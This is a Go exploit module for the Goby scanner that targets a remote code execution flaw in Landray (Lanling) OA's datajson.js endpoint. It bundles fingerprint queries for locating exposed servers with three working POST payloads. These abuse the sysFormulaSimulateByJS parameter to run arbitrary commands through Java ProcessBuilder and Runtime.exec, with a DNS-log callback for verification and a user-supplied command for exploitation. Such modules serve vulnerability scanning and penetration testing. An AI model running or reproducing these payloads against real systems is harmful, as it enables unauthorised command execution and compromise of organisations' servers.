package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Lanling OA datajson.js remote code execution",
    "Description": "<p>Lanling OA office system is an OFFICE oa tool used for instant office communication.  </p><p>Lanling OA has remote code execution vulnerability.  Successful exploitation of this vulnerability can cause a program to crash or even arbitrary code execution. </p>",
    "Impact": "<p>Lanling OA datajson.js remote code execution</p>",
    "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a>  </p><p>2. Configure access policies and whitelist access on security devices such as firewalls.  </p><p>3. If it is not necessary, prohibit the public network from accessing the system. </p>",
    "Product": "Landray-OA",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Information technology application innovation industry",
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "蓝凌OA datajson.js 远程代码执行",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌oa办公系统是用于即时办公通讯的oa办公工具。</p><p>蓝凌oa存在远程代码执行漏洞。<span style=\"font-size: 16px;\">成功利用此漏洞可导致程序崩溃甚至任意代码执行。</span><br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">攻击者可利用该漏洞在受影响的进程上下文中执行任意代码。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "信创",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Lanling OA datajson.js remote code execution",
            "Product": "Landray-OA",
            "Description": "<p>Lanling OA office system is an OFFICE oa tool used for instant office communication.&nbsp;&nbsp;</p><p>Lanling OA has remote code execution vulnerability.&nbsp;&nbsp;Successful exploitation of this vulnerability can cause a program to crash or even arbitrary code execution.&nbsp;</p>",
            "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a> &nbsp;</p><p>2. Configure access policies and whitelist access on security devices such as firewalls.&nbsp;&nbsp;</p><p>3. If it is not necessary, prohibit the public network from accessing the system.&nbsp;</p>",
            "Impact": "<p>Lanling OA datajson.js remote code execution</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Author": "兔兔",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-07-28",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.1",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/data/sys-common/datajson.js"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Sec-Ch-Ua", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"")
			cfg.Header.Store("Sec-Ch-Ua-Mobile", "?0")
			cfg.Header.Store("Sec-Ch-Ua-Platform", "\"macOS\"")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
			cfg.Header.Store("Sec-Fetch-Site", "none")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
			cfg.Header.Store("Cookie", "SESSION=YjA5MWNkNzUtODU0ZC00NDY0LWJhODItN2JiMzM3Nzg2MTkw; Hm_lvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099; Hm_lpvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Length", "105")
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=new java.lang.ProcessBuilder(\"ping\",\"" + checkUrl + "\").start()&type=1"
			httpclient.DoHttpRequest(u, cfg)
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"ping%20-c%204%20" + checkUrl + "\")&type=1"
			httpclient.DoHttpRequest(u, cfg)
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=var+calc='ping+" + checkUrl + "';java.lang.Runtime.getRuntime().exec(calc)&type=1"
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			s := ss.Params["AttackType"].(string)
			uri := "/data/sys-common/datajson.js"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Sec-Ch-Ua", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"")
			cfg.Header.Store("Sec-Ch-Ua-Mobile", "?0")
			cfg.Header.Store("Sec-Ch-Ua-Platform", "\"macOS\"")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
			cfg.Header.Store("Sec-Fetch-Site", "none")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
			cfg.Header.Store("Cookie", "SESSION=YjA5MWNkNzUtODU0ZC00NDY0LWJhODItN2JiMzM3Nzg2MTkw; Hm_lvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099; Hm_lpvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Length", "105")
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=new java.lang.ProcessBuilder(\"" + s + "\").start()&type=1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "{\"success\":true,\"data\":[{") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "success!"
				}
			}
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"" + s + "\")&type=1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "{\"success\":true,\"data\":[{") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "success!"
				}
			}
			cfg.Data = "s_bean=sysFormulaSimulateByJS&script=var+calc='" + s + "';java.lang.Runtime.getRuntime().exec(calc)&type=1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "{\"success\":true,\"data\":[{") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "success!"
				}
			}
			return expResult
		},
	))
}
